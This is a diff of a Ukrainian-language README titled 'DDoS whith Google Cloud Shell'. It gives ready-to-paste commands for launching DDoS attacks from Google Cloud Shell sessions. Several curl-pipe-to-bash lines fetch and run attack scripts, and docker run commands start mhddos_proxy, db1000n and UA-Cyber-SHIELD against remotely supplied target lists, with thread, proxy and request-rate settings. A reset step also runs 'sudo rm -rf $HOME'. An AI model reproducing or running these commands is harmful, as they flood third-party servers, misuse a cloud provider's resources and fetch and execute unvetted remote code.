@@ -1,8 +1,6 @@
 # [DDoS whith Google Cloud Shell](https://sites.google.com/view/operationrussia/googleshell)
-#### Scripts for durable cloudshell session. Test!     
+#### Scripts for durable cloudshell session. Test!                                                                                 **| [English version](https://github.com/Operation-Stop-russia/Gcloudshell_ddos/blob/main/README-EN.md)**
 #    
-**[English version](https://github.com/Operation-Stop-russia/Gcloudshell_ddos/blob/main/README-EN.md)**
-#
 ### Використовуємо https://shell.cloud.google.com/?fromcloudshell=true&show=terminal
 ### з ПК та смартфонів (*зі всього, що має браузер*;)
 #
@@ -14,21 +12,29 @@
 • **Для скидання Cloud Shell** - Видаліть усі файли з домашнього каталогу, команда: `sudo rm -rf $HOME`, далі - у меню Cloud Shell клацніть значок меню з трьома крапками, а потім натисніть "Restart" *(Буде надано нову віртуальну машину, а домашній каталог буде відновлено до стану за замовчуванням)*
 #
 ### Стабільні сеанси (*90%*)
-:white_check_mark:**Команда для встановлення та запуску mhddos_proxy (по [Layer7](https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst)):**
+:white_check_mark:**Команда для встановлення та запуску mhddos_proxy** (Bash):
 ```
 curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m.sh | bash
 ```
-:white_check_mark: **Команда для встановлення та запуску db1000n:** 
+:white_check_mark:**Команда для встановлення та запуску mhddos_proxy** (*Docker*):
+```
+sudo docker run -it --rm  --cpus="0.7" --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7.lst -t 3000 --vpn 1 --http-methods GET --rpc 500
+```
+:white_check_mark: **Команда для встановлення та запуску db1000n** (Bash):
 ```
 curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/db1000n_GShell.sh | bash
 ``` 
-:white_check_mark:**Команда для встановлення та запуску mhddos_proxy** (*попередня менш продуктивна версія (**тільки проксі**)*):
+:white_check_mark:**Команда для встановлення та запуску db1000n** (*Docker*):
+```
+sudo docker run -it --rm  --cpus="0.5" --rm -it --pull always ghcr.io/arriven/db1000n
+```
+:white_check_mark:**Команда для встановлення та запуску mhddos_proxy** *тільки проксі*  (Bash):
 ```
 curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m-proxy_only.sh | bash
 ```
-:white_check_mark:**Команда для встановлення та запуску mhddos_proxy** (*Docker*):
+:white_check_mark:**Команда для встановлення та запуску UA-Cyber-SHIELD** (*Docker*):
 ```
-sudo docker run -it --rm  --cpus="0.75" --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7.lst -t 1000 --vpn 5 --rpc 500
+sudo docker run -it --rm  --cpus="0.5" ghcr.io/opengs/uashield:master --workers=256 --withProxy=true
 ```
 #
 ### Тести/допрацювання/експерименти. 
